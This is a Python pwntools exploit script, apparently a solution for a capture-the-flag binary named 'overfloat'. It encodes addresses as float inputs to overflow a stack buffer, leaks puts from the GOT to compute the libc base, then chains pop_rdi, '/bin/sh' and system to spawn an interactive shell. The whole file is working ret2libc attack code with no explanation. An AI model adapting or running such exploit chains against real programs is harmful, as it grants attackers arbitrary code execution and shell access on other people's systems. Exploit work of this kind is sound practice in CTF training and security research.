#!/usr/bin/env python3
import pwn
import struct

libc = pwn.ELF("./libc-2.27.so", checksec=False)
elf = pwn.ELF("./overfloat_patched", checksec=False)
rop = pwn.ROP("./overfloat_patched", checksec=False)
io = pwn.process("./overfloat_patched")

offset = 56

puts_plt = 0x400690
puts_got = 0x602020
ret = 0x400661
main = 0x400993
pop_rdi = 0x400a83


def uf(byte: bytes):
    return struct.unpack("f", byte)[0]


def send(x: int):
    p1 = (x & 0xFFFFFFFF).to_bytes(4, "little")
    p2 = (x >> 32).to_bytes(4, "little")

    io.sendline(str(uf(p1)).encode())
    io.sendline(str(uf(p2)).encode())


def leak():
    for i in range(7):
        send(0xDEADBEEFDEADBEEF)

    send(pop_rdi)
    send(puts_got)
    send(puts_plt)
    send(main)
    io.sendline(b"done")
    io.recvuntil(b"BON VOYAGE!\n")

    leak = io.recvline().rstrip()
    leak = leak + (8 - len(leak)) * b"\x00"
    leak = struct.unpack("Q", leak)[0]

    base = leak - libc.symbols["puts"]
    libc.address = base

    print("base: ", hex(base))


def exploit():
    for i in range(7):
        send(0xDEADBEEFDEADBEEF)

    send(pop_rdi)
    send(next(libc.search(b"/bin/sh")))
    send(ret)
    send(libc.symbols["system"])
    io.sendline(b"done")

leak()
exploit()
io.interactive()
